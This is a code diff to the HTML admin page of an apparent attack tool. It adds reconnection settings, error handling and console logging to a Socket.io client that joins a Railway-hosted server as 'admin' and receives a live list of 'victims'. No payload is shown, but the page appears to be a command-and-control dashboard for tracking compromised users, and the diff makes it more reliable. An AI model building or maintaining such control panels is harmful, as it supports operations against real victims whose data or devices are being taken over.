@@ -347,8 +347,9 @@
 
 <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 <script>
-// Socket.io server URL
+// Socket.io server URL (Railway) - используем HTTPS, Socket.io сам выберет WebSocket
 const SOCKET_SERVER_URL = 'https://my-project-production-8e23.up.railway.app';
+console.log('[ADMIN] Socket server URL:', SOCKET_SERVER_URL);
 </script>
 <script>
 (function() {
@@ -359,7 +360,12 @@ const SOCKET_SERVER_URL = 'https://my-project-production-8e23.up.railway.app';
     tick(); setInterval(tick, 1000);
 
     // Socket
-    const socket = io(SOCKET_SERVER_URL);
+    const socket = io(SOCKET_SERVER_URL, {
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: 10,
+        reconnectionDelay: 1000
+    });
     let victims = [];
 
     socket.emit('admin_join');
@@ -369,10 +375,18 @@ const SOCKET_SERVER_URL = 'https://my-project-production-8e23.up.railway.app';
         document.getElementById('conn-label').innerHTML =
             '<span class="dot dot-on"></span>Connected <span style="color:var(--border2)">·</span> <span style="font-family:monospace;font-size:10px;">' + socket.id.slice(0, 8) + '…</span>';
         log('Connected to server', 'i');
+        console.log('[ADMIN] Connected! ID:', socket.id);
     });
-    socket.on('disconnect', () => {
+
+    socket.on('connect_error', (err) => {
+        console.error('[ADMIN] Connection error:', err.message);
+        log('Connection error: ' + err.message, 'e');
+    });
+
+    socket.on('disconnect', (reason) => {
         document.getElementById('conn-label').innerHTML = '<span class="dot dot-off"></span>Disconnected';
-        log('Disconnected', 'e');
+        log('Disconnected: ' + reason, 'e');
+        console.log('[ADMIN] Disconnected:', reason);
     });
 
     socket.on('victims_update', function(data) {
